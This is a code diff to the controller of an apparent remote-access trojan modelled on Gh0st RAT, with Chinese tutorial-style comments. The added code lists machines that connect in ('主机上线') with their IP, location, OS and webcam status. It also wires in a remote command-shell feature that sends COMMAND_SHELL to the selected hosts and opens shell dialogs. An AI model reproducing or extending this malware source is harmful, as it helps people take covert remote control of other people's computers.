@@ -8,6 +8,7 @@
 #include "afxdialogex.h"
 #include "SettingDlg.h"
 #include "..\common\macros.h"
+#include "ShellDlg.h"
 
 #ifdef _DEBUG
 #define new DEBUG_NEW
@@ -171,11 +172,11 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 	CDialog	*dlg = (CDialog	*)pContext->m_Dialog[1];      //这里就是ClientContext 结构体的int m_Dialog[2];
 
 	// 交给窗口处理
-	/*if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
+	if (pContext->m_Dialog[0] > 0)                //这里查看是否给他赋值了，如果赋值了就把数据传给功能窗口处理
 	{
 		switch (pContext->m_Dialog[0])
 		{
-		case FILEMANAGER_DLG:
+		/*case FILEMANAGER_DLG:
 			((CFileManagerDlg *)dlg)->OnReceiveComplete();
 			break;
 		case SCREENSPY_DLG:
@@ -192,7 +193,7 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 			break;
 		case SYSTEM_DLG:
 			((CSystemDlg *)dlg)->OnReceiveComplete();
-			break;
+			break;*/
 		case SHELL_DLG:
 			((CShellDlg *)dlg)->OnReceiveComplete();
 			break;
@@ -200,7 +201,7 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 			break;
 		}
 		return;
-	}*/
+	}
 
 	switch (pContext->m_DeCompressionBuffer.GetBuffer(0)[0])   //如果没有赋值就判断是否是上线包和打开功能功能窗口
 	{                                                           //讲解后回到ClientContext结构体
@@ -252,10 +253,10 @@ void CPCRemoteDlg::ProcessReceiveComplete(ClientContext *pContext)
 		break;
 	case TOKEN_PSLIST:
 		g_pConnectView->PostMessage(WM_OPENPSLISTDIALOG, 0, (LPARAM)pContext);
-		break;
-	case TOKEN_SHELL_START:
-		g_pConnectView->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
 		break;*/
+	case TOKEN_SHELL_START:
+		g_pPCRemoteDlg->PostMessage(WM_OPENSHELLDIALOG, 0, (LPARAM)pContext);
+		break;
 		// 命令停止当前操作
 	default:
 		closesocket(pContext->m_Socket);
@@ -523,7 +524,8 @@ int CPCRemoteDlg::InitList(void)
 
 
 // add to online list
-void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, CString strCPU, CString strVideo, CString strPing)
+void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CString strOS, 
+	CString strCPU, CString strVideo, CString strPing, ClientContext *pContext)
 {
 	m_CList_Online.InsertItem(0, strIP);
 	m_CList_Online.SetItemText(0, ONLINELIST_ADDR, strAddr);
@@ -532,6 +534,7 @@ void CPCRemoteDlg::AddList(CString strIP, CString strAddr, CString strPCName, CS
 	m_CList_Online.SetItemText(0, ONLINELIST_CPU, strCPU);
 	m_CList_Online.SetItemText(0, ONLINELIST_VIDEO, strVideo);
 	m_CList_Online.SetItemText(0, ONLINELIST_PING, strPing);
+	m_CList_Online.SetItemData(0, (DWORD)pContext);
 	ShowMessage(true, strIP+"主机上线");
 }
 
@@ -608,7 +611,9 @@ void CPCRemoteDlg::OnOnlineAudio()
 void CPCRemoteDlg::OnOnlineCmd()
 {
 	// TODO: 在此添加命令处理程序代码
-	MessageBox("终端管理");
+	//MessageBox("终端管理");
+	BYTE bToken = COMMAND_SHELL;
+	SendSelectCommand(&bToken, sizeof(BYTE));
 }
 
 
@@ -906,7 +911,19 @@ LRESULT CPCRemoteDlg::OnAddToList(WPARAM wParam,LPARAM lParam)
 			strAddr = m_QQwry->IPtoAdd(strIP);
 		}
 
-		AddList(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing);
+		AddList(strIP, strAddr, strPCName, strOS, strCPU, strVideo, strPing, pContext);
 	}
 	catch (...){}
+}
+
+void CPCRemoteDlg::SendSelectCommand(PBYTE pData, UINT nSize)
+{
+	POSITION pos = m_CList_Online.GetFirstSelectedItemPosition();
+	while(pos)
+	{
+		int nItem = m_CList_Online.GetNextSelectedItem(pos);
+		ClientContext *pContext = (ClientContext*)m_CList_Online.GetItemData(nItem);
+
+		m_iocpServer->Send(pContext, pData, nSize);
+	}
 }
